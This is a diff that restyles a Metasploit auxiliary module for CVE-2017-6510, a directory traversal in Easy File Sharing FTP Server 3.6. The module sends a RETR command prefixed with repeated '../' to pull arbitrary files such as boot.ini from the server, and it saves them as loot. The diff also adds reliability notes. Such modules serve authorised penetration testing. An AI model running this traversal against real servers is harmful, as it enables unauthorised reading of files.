@@ -9,31 +9,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Easy File Sharing FTP Server 3.6 Directory Traversal',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier.
-        This vulnerability allows an attacker to download arbitrary files from the server by crafting
-        a RETR command that includes file system traversal strings such as '../'
-      },
-      'Platform'       => 'win',
-      'Author'         =>
-        [
-          'Ahmed Elhady Mohamed'   # @kingasmk ahmed.elhady.mohamed[at]gmail.com
+    super(
+      update_info(
+        info,
+        'Name' => 'Easy File Sharing FTP Server 3.6 Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier.
+          This vulnerability allows an attacker to download arbitrary files from the server by crafting
+          a RETR command that includes file system traversal strings such as '../'
+        },
+        'Platform' => 'win',
+        'Author' => [
+          'Ahmed Elhady Mohamed' # @kingasmk ahmed.elhady.mohamed[at]gmail.com
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2017-6510']
         ],
-      'DisclosureDate' => '2017-03-07'
-    ))
+        'DisclosureDate' => '2017-03-07',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
         OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'boot.ini'])
-      ])
+      ]
+    )
   end
 
   def check_host(ip)
@@ -63,8 +70,8 @@ class MetasploitModule < Msf::Auxiliary
         file = ::File.basename(file_path)
 
         # make RETR request and store server response message...
-        retr_cmd = ( "../" * datastore['DEPTH'] ) + "#{file_path}"
-        res = send_cmd( ["RETR", retr_cmd])
+        retr_cmd = ("../" * datastore['DEPTH']) + "#{file_path}"
+        res = send_cmd(["RETR", retr_cmd])
 
         # read the file data from the socket that we opened
         # dont assume theres still a sock to read from. Per #7582
@@ -83,7 +90,7 @@ class MetasploitModule < Msf::Auxiliary
           return
         end
 
-        if response_data.length == 0 or ! (res =~ /^150/ )
+        if response_data.length == 0 or !(res =~ /^150/)
           print_status("File (#{file_path})from #{peer} is empty...")
           return
         end
@@ -94,7 +101,6 @@ class MetasploitModule < Msf::Auxiliary
         vprint_line(response_data)
         print_good("Stored #{file_path} to #{loot_file}")
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
       vprint_error(e.message)
       elog(e)
